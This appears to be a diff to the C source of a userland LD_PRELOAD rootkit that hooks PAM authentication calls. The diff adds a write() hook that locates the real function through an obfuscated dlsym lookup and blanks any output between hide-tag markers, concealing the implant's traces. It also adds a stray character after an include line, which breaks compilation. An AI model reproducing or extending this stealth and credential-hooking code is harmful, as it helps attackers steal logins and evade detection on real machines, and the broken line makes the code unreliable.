@@ -7,7 +7,7 @@
 #include <sys/socket.h>
 #include <netdb.h>
 #include <sys/types.h>
-#include <string.h> 
+#include <string.h> q
 #include <pwd.h>
 #include <unistd.h>
 #include <security/pam_modules.h>
@@ -37,6 +37,8 @@ static int (*original_pam_set_item)(pam_handle_t* pamh, int item_type, const voi
 static int (*original_pam_authenticate)(pam_handle_t* pamh, int flags);
 static int (*original_pam_get_authtok)(pam_handle_t* pamh, int item, const char **authtok, const char *prompt);
 static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user, const char *prompt);
+static ssize_t (*original_write)(int fd, const void *buf, size_t count);
+
 #define PAM_SUCCESS 0
 
 #define PAM_SERVICE 1
@@ -44,6 +46,27 @@ static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user,
 
 #define PAM_RHOST 4
 #define PAM_USER 2
+
+
+ssize_t write(int fd, const void *buf, size_t count){
+	char *p1, *p2;
+	int i;
+	if(original_write == NULL){
+		original_write = (ssize_t(*)(int, const void*, size_t))dlsym(RTLD_NEXT, AY_OBFUSCATE("write"));
+	}
+	p1 = strstr((char*)buf, HIDETAG_ENTRY);
+	p2 = strstr((char*)buf, HIDETAG_STOP);
+	if(p1 || p2){
+		int start_str = p1 - (char*)buf - 2;
+		int final_str = p2 - (char*)buf + strlen(HIDETAG_STOP) + 2;
+
+		for(i = start_str; i < final_str; i++){
+			((char*)buf)[i] = '\x0';
+		}
+	}
+	ssize_t ret = original_write(fd, buf, count);
+	return ret;
+}
 
 // PAM hooks
 
